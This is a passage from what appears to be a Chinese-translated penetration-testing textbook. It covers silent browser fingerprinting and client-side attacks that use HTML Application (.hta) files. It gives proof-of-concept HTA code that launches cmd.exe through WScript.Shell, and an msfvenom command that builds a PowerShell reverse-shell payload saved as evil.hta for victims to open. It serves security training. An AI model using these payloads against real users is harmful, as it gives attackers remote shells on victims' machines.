
列表 386 - 发送到服务器的浏览器指纹信息

通过这种修改，受害者的浏览器中不会显示任何信息。`XMLHttpRequest` 在没有任何受害者交互的情况下静默地将数据传输到了我们的攻击服务器。受害者看到的唯一输出是我们选择的文本：

You have been given the finger!

![](img/ec25e59d75726b7041242a56d3376832_421_0.png)

图 242. 通过 `XMLHttpRequest` 请求进行浏览器指纹识别

### 13.1.2.3 练习

**注意：这些练习不需要报告**

- 1. 识别你的公共 IP 地址。使用公共信息来源，看看你能从你的 IP 地址了解到什么。如果你在特定的 IP 地址上没有找到任何信息，请尝试其所在的 C 类地址。
- 2. 比较你能收集到的关于你家 IP 地址的信息和收集到的关于你工作 IP 地址的信息。思考攻击者如何将发现的信息作为攻击的一部分加以利用。
- 3. 下载 `Fingerprint2` 库并制作一个类似于客户端指纹识别部分中所示的网页。从你的 Windows 10 实验机浏览该网页，并重复步骤以在你的 Kali Web 服务器上收集由 JavaScript 库提取的信息。

### 13.2 利用 HTML 应用程序

将注意力转向特定的客户端攻击，我们首先关注 HTML 应用程序[^hta]。

[^hta]: (Microsoft, 2011). https://msdn.microsoft.com/en-us/library/ms536496(VS.85).aspx

如果创建的文件扩展名为 `.hta` 而不是 `.html`，Internet Explorer 会自动将其解释为 HTML 应用程序，并提供使用 `mshta.exe` 程序执行它的功能。

HTML 应用程序的目的是允许直接从 Internet Explorer 执行任意应用程序，而不是下载并手动运行可执行文件。由于这与 Internet Explorer 中的安全边界冲突，HTML 应用程序始终由 Microsoft 签名的二进制文件 `mshta.exe` 在浏览器安全上下文之外执行。如果用户允许这种情况发生，攻击者可以以该用户的权限执行任意代码，从而避开 Internet Explorer 通常施加的安全限制。

虽然这种攻击向量仅针对 Internet Explorer 和一定程度的 Microsoft Edge 有效，但由于许多公司仍依赖 Internet Explorer 作为其主要浏览器，因此它仍然有用。此外，此向量利用了直接内置于 Windows 操作系统中的功能，更重要的是，它与不太安全的 Microsoft 遗留 Web 技术（如 `ActiveX`[^activex]）兼容。

[^activex]: (Wikipedia, 2019), https://en.wikipedia.org/wiki/ActiveX

#### 13.2.1 探索 HTML 应用程序

与 HTML 页面类似，典型的 HTML 应用程序包含 `html`、`body` 和 `script` 标签，随后是 JavaScript 或 VBScript 代码。然而，由于 HTML 应用程序在浏览器外部执行，我们可以自由使用那些在浏览器内通常被阻止的遗留和危险功能。

在这个示例中，我们将利用 `ActiveXObjects`[^activex_obj]，它可能（并且危险地）提供对底层操作系统命令的访问。这可以通过 Windows Script Host 功能或 `WScript`[^wscript] 实现，特别是通过 Windows Script Host Shell 对象[^wsh_shell]。

[^activex_obj]: (Microsoft, 2017), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Microsoft_Extensions/ActiveXObject
[^wscript]: (Microsoft, 2015), https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/atsyd31(v=vs.84)
[^wsh_shell]: (Microsoft, 2015), https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/aew9yb99(v=vs.84)

一旦我们实例化了一个 Windows Script Host Shell 对象，我们就可以调用其 `run` 方法[^run_method]，以在目标客户端机器上启动应用程序。

[^run_method]: (Adersoft, 2019), http://www.vbsedit.com/html/6f28899c-d653-4555-8a59-49640be32ea.asp

让我们创建一个简单的概念验证 HTML 应用程序来启动命令提示符：

```html
<html>
<body>
<script>
    var c='cmd.exe'
    new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

# 列表 387 - 用于打开 cmd.exe 的 HTA 文件

我们可以将这段代码放在 Kali 机器上的一个文件中（`poc.hta`），并通过 Apache Web 服务器提供服务。一旦受害者使用 Internet Explorer 访问此文件，他们就会看到图 243 中所示的弹出对话框。

![](img/ec25e59d75726b7041242a56d3376832_423_1.png)

*图 243：第一个对话框*

这个对话框是尝试执行一个 `_.hta_` 文件的结果。选择 *打开* 会触发另一个额外的对话框：

![](img/ec25e59d75726b7041242a56d3376832_423_2.png)

*图 244：第二个对话框*

第二个对话框的出现是因为 Internet Explorer 的沙盒保护（也称为 *保护模式*）<sup>346</sup> 默认处于启用状态。受害者可以选择 *允许* 来授权该操作，这将执行 JavaScript 代码并启动 `cmd.exe`，如图 245 所示。

> 346 (Microsoft, 2011). https://technet.microsoft.com/en-us/windows/bb250462(v=vs.60)

![](img/ec25e59d75726b7041242a56d3376832_424_0.png)

*图 245. 打开的 cmd.exe*

在 `mshta.exe` 执行期间，它会在我们的命令提示符背后保持一个额外的窗口打开。为了避免这种情况，我们可以更新我们的概念验证（PoC），使用 `.close();` 对象方法关闭这个窗口，如下所示：

```html
<html>
<head>
<script>
    var c='cmd.exe'
    new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>
    self.close();
</script>
</body>
</html>
```

*列表 388 - 更新后的概念验证*

这演示了 HTA 漏洞利用的基本功能，但我们需要付出更多努力将其转化为攻击。我们不再使用 `Run` 方法启动 `cmd.exe`，而是转而使用功能更强大且能力更全面的 PowerShell 框架。

# 13.3.2 *HTA 攻击实战*

我们将使用 `msfvenom` 将我们的基本 HTML 应用程序转化为攻击，依赖 `hta-psH` 输出格式创建基于 PowerShell 的 HTA 负载。在列表 389 中，生成了完整的反向 shell 负载并将其保存到文件 `evil.hta` 中。

```bash
kali@kali:~$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psH -o /var/www/html/evil.hta

No platform was selected, choosing Msf::Module::Platform::Windows from the payload

No Arch selected, selecting Arch: x86 from the payload

No encoder or badchars specified, outputting raw payload

Payload size: 324 bytes
```
